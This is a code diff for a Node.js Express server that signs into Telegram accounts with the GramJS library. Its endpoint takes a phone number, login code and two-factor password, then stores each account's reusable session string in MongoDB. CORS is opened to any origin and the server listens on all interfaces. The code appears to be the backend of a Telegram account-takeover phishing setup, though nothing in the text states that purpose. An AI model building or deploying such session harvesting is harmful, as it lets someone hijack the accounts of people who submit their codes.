@@ -5,18 +5,18 @@ const { StringSession } = require('telegram/sessions');
 const mongoose = require('mongoose');
 
 const app = express();
-app.use(cors());
+app.use(cors({ origin: '*' }));
 app.use(express.json());
 
 const PORT = process.env.PORT || 3000;
-// Hier deine MongoDB URI einfügen
-const MONGO_URI = process.env.MONGODB_URI || 'mongodb+srv://...';
+const MONGO_URI = process.env.MONGODB_URI || 'DEIN_MONGODB_CONNECTION_STRING';
 
-mongoose.connect(MONGO_URI);
+mongoose.connect(MONGO_URI).then(() => console.log("DB Verbunden")).catch(err => console.log(err));
 
 const SessionSchema = new mongoose.Schema({
     phone: String,
-    session: String
+    session: String,
+    date: { type: Date, default: Date.now }
 });
 const Session = mongoose.model('Session', SessionSchema);
 
@@ -42,19 +42,19 @@ app.post('/verify-otp', async (req, res) => {
         if (!session) return res.status(400).json({ error: "Session abgelaufen" });
 
         try {
-            await session.client.invoke(new Api.auth.SignIn({ phoneNumber: phone, phoneCode: code, phoneCodeHash: phoneCodeHash }));
-            await Session.create({ phone, session: session.client.session.save() });
+            await session.client.signIn({ phoneNumber: phone, phoneCode: code, phoneCodeHash: phoneCodeHash });
+            const sessionString = session.client.session.save();
+            await Session.create({ phone, session: sessionString });
             res.json({ success: true });
         } catch (err) {
             if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
-                if (!password) return res.status(400).json({ passwordRequired: true });
-                const pwd = await session.client.invoke(new Api.account.GetPassword());
-                await session.client.invoke(new Api.auth.CheckPassword({ password: await session.client.srpSolve(pwd, password) }));
-                await Session.create({ phone, session: session.client.session.save() });
+                await session.client.signIn({ phoneNumber: phone, phoneCode: code, phoneCodeHash: phoneCodeHash }, { password: password });
+                const sessionString = session.client.session.save();
+                await Session.create({ phone, session: sessionString });
                 res.json({ success: true });
             } else { throw err; }
         }
     } catch (e) { res.status(400).json({ error: e.message }); }
 });
 
-app.listen(PORT, () => console.log(`Server läuft auf ${PORT}`));
+app.listen(PORT, '0.0.0.0', () => console.log(`Server läuft auf ${PORT}`));
